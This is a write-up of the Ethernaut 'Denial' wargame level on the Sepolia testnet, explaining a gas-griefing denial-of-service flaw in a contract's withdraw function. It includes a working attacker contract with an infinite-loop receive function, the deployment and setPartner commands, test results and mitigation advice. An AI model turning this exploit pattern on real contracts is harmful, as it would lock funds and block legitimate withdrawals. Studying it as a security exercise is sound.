# Ethernaut Challenge 20 — Denial

This level demonstrates how external calls can introduce **denial of service (DoS)** vulnerabilities through gas griefing.

Instance address:

```
0x7605C41F2a34616F699F363DEB97adF28cAdF343
````

---

## 🎯 Goal

Prevent the owner from successfully executing `withdraw()` while the contract still has funds and the transaction uses **≤ 1M gas**.

---

## 🔍 Contract inspection

Set the contract address:

```bash
DENIAL_SEPOLIA=0x7605C41F2a34616F699F363DEB97adF28cAdF343
````

Check the owner:

```bash
cast call $DENIAL_SEPOLIA \
    "owner()(address)" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
0x0000000000000000000000000000000000000A9e
```

Check the partner:

```bash
cast call $DENIAL_SEPOLIA \
    "partner()(address)" \
    --rpc-url $SEPOLIA_RPC_URL
```

```
0x0000000000000000000000000000000000000000
```

Check contract balance:

```bash
cast call $DENIAL_SEPOLIA \
    "contractBalance()(uint256)" \
    --rpc-url $SEPOLIA_RPC_URL
```

```
1000000000000000  // 0.001 ether
```

---

## 🧠 Vulnerability analysis

The critical code is:

```solidity
partner.call{value: amountToSend}("");
payable(owner).transfer(amountToSend);
```

### Problem

* `call` forwards **almost all remaining gas** to `partner`
* the return value is **ignored**
* the partner can execute arbitrary logic

### Exploit idea

A malicious partner can:

* consume all forwarded gas
* leave too little gas for the rest of the function
* cause `withdraw()` to fail

This is a **denial of service via gas griefing**.

---

## 💣 Attack strategy

1. Become the `partner`
2. Implement a `receive()` function that **burns all gas**
3. When `withdraw()` is called:

   * gas is forwarded to attacker
   * attacker consumes it
   * not enough gas remains
   * function fails before paying the owner

---

## 🧪 Attacker contract

The [DenialAttacker.sol](DenialAttacker.sol) implements an infinite loop in the receive function to consume all the forwarded gas by the call.

```solidity
receive() external payable {
    while (true) {}
}
```
---

## 🧪 Local test (Foundry)

We have created a test file [DenialTest.t.sol](../../test/challenge-20-denial/DenialTest.t.sol) to simulate the exploit.

To simulate realistic conditions, we limit the gas:

```solidity
(bool success, ) = address(denial).call{gas: 100000}(
    abi.encodeWithSignature("withdraw()")
);

assertFalse(success);
```

### Gas analysis

Logs show:

```
Gas left before call: ~99634
Gas left after call:  ~1244
```

* almost all gas is forwarded and consumed
* remaining gas is insufficient
* `withdraw()` runs out of gas

---

## 🚀 Exploit on Sepolia

Deploy attacker:

```bash
forge create src/challenge-20-denial/DenialAttacker.sol:DenialAttacker \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast \
  --constructor-args $DENIAL_SEPOLIA
```

```
DenialAttacker: 0x4c5720Ab9F0a70E289B154F25538D4d2bE433855
```

Set as partner:

```bash
DENIAL_ATTACKER_SEPOLIA=0x4c5720Ab9F0a70E289B154F25538D4d2bE433855

cast send $DENIAL_ATTACKER_SEPOLIA \
    "setPartner()" \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Verify:

```bash
cast call $DENIAL_SEPOLIA \
    "partner()(address)" \
    --rpc-url $SEPOLIA_RPC_URL
```

```
0x4c5720Ab9F0a70E289B154F25538D4d2bE433855
```

---

## ⚠️ Important observation (gas behavior)

Calling:

```bash
cast send $DENIAL_ATTACKER_SEPOLIA "attack()"
```

**does not revert**.

Why?

* EVM forwards at most **63/64 of the gas**
* attacker consumes forwarded gas
* caller still keeps ~1/64
* if initial gas is large enough → function still completes

Example:

```
Gas Limit: 16,442,558
Gas Used:  15,987,649 (97.23%)
Remaining: ~454,909
```

That remaining gas was sufficient to finish execution.

---

## 🛡️ Security takeaway

This challenge highlights a subtle but critical issue:

* low-level `call` forwards almost all gas
* malicious contracts can **grief execution**
* ignoring return values is dangerous

### Best practices

* avoid forwarding all gas:

```solidity
call{gas: <fixed amount>}
```

* check return values of low-level calls
* be careful with external calls in critical flows







